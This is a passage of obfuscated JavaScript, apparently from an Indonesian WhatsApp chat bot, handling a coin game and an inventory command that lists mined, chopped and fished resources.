_0x59613d(_0x4e6bda,_0x2edfb5);},'dOwZM':function(_0x154b1d,_0x1fd99b){return _0x154b1d(_0x1fd99b);},'KRPuh':function(_0x579c87,_0x242e19){return _0x579c87(_0x242e19);},'UGAku':'Error\x20'},_0x1e1bfc=Math[_0x4f5c2b(0x3c3,0x45e,0x33d,0x330)](_0x485672[_0x4f5c2b(0x30a,0x332,0x2e0,0x32e)](Math[_0x4f5c2b(0x2fa,0x2fd,0x29f,0x365)](),0xc80+0x1*0x1a06+-0x2684)),_0x3fc381=_0x485672[_0x58a7fb(0x3f6,0x406,0x405,0x400)](cas,0x26e8+-0x10f3*-0x2+0x2*-0x2467);function _0x4f5c2b(_0x4201bf,_0x1b9729,_0x2f7f51,_0x5cddf9){return _0x5b2460(_0x4201bf-0x13d,_0x4201bf-0x54e,_0x5cddf9,_0x5cddf9-0x1bc);}const _0x467e73=resg[Math['floor'](_0x485672[_0x4f5c2b(0x30a,0x26a,0x298,0x2fb)](Math[_0x58a7fb(0x341,0x3d4,0x336,0x2ef)](),resg[_0x58a7fb(0x486,0x3b0,0x429,0x42e)]))];if(_0x485672[_0x4f5c2b(0x432,0x4cc,0x46d,0x3cb)](_0x467e73,'Kamu\x20MENAN'+_0x58a7fb(0x431,0x462,0x439,0x3e9)))_0x485672[_0x58a7fb(0x3e6,0x38a,0x3d2,0x339)](addKoinUser,sender,_0x3fc381),_0x485672[_0x58a7fb(0x3bf,0x471,0x3fe,0x36c)](reply,_0x58a7fb(0x4c4,0x42c,0x446,0x4db)+_0x58a7fb(0x3bf,0x464,0x455,0x496)+enter+enter+(_0x4f5c2b(0x318,0x31c,0x359,0x33b)+_0x4f5c2b(0x30b,0x269,0x30c,0x351)+_0x4f5c2b(0x355,0x3e5,0x3a9,0x3b1)+_0x58a7fb(0x477,0x3b0,0x3e5,0x424))+_0x3fc381+'_*'+enter+enter+(_0x4f5c2b(0x306,0x305,0x30e,0x272)+_0x4f5c2b(0x393,0x39c,0x409,0x345)+'\x20membeli\x20l'+'imit'));else _0x467e73==_0x4f5c2b(0x353,0x31f,0x302,0x39e)+'!!'?(confirmATM(sender,cas),_0x485672[_0x58a7fb(0x443,0x489,0x43c,0x3d3)](reply,_0x58a7fb(0x451,0x483,0x45d,0x423)+'\x20🥺\x20dan\x20keh'+_0x4f5c2b(0x394,0x337,0x30c,0x41a)+_0x58a7fb(0x466,0x475,0x433,0x442)+'\x20'+cas)):reply(_0x485672[_0x4f5c2b(0x41f,0x457,0x44f,0x421)]);},0xd7*-0xb+0xb61*-0x1+0x2056),setTimeout(()=>{function _0x25187e(_0x1a445d,_0x4d6347,_0x254713,_0x2ba913){return _0x5b2460(_0x1a445d-0x91,_0x1a445d-0x61f,_0x4d6347,_0x2ba913-0x12f);}const _0x4c5995={'yxeFe':function(_0x5128ba,_0x2d90fc){return _0x5128ba(_0x2d90fc);}};_0x4c5995['yxeFe'](reply,_0x25187e(0x490,0x4ee,0x4ed,0x47d)+'asil!.');},0x1493+-0x1*0x4eb+0x3*-0x538),await limitAdd(sender,limit);break;case _0x5b2460(-0x180,-0x206,-0x27e,-0x249):case'tas':case _0x5b2460(-0x165,-0x1a2,-0x1a1,-0x1aa):inventory=_0x5b2460(-0x181,-0x1ee,-0x22a,-0x1f5)+_0x1eb754(0x4bb,0x478,0x437,0x4f2)+_0x5b2460(-0x288,-0x220,-0x1e7,-0x217)+_0x1eb754(0x540,0x505,0x482,0x520)+getMiningcoal(sender)+(_0x1eb754(0x5d5,0x556,0x51e,0x528)+_0x1eb754(0x4b7,0x4f2,0x4bf,0x477))+getMiningstone(sender)+('\x0a❄️\x20*COPPER'+_0x5b2460(-0x1a3,-0x235,-0x253,-0x250))+getMiningore(sender)+('\x0a🛠️\x20*INGOT\x20'+'ORE*\x20:\x20')+getMiningingot(sender)+('\x0a🌐\x20*WOOD*\x20'+':\x20')+getNebangKayu(sender)+(_0x5b2460(-0x120,-0x16c,-0x15d,-0x191)+':\x20')+getMancingIkan(sender)+(_0x1eb754(0x5e3,0x56f,0x542,0x606)+_0x5b2460(-0x21a,-0x1dc,-0x16b,-0x1be)+_0x5b2460(-0x1e5,-0x16d,-0x11d,-0x1c1)+_0x5b2460(-0x18f,-0x150,-0x155,-0x183)+_0x5b2460(-0x12b,-0x186,-0x146,-0x1a6)+'nyak\x20inven'+_0x5b2460(-0x14c,-0x1c5,-0x1f8,-0x1d7)),alpha['sendMessag'+'e'](from,pp_userz,image,{'thumbnail':Buffer[_0x1eb754(0x45c,0x477,0x4b3,0x50c)](0x584*0x1+0xf67*0x1+-0x33*0x69),'quoted':mek,'caption':inventory});break;}
if (isGroup && budy != undefined) {
	} else {
	console.log(color('[ PRIVATE ]', 'aqua'), 'SELF-MODE', color(pushname))
	}		
	} catch (e) {
    e = String(e)
    if (!e.includes("this.isZero")) {
	console.log('Message : %s', color(e, 'green'))
        }
	// console.log(e)
	}
}
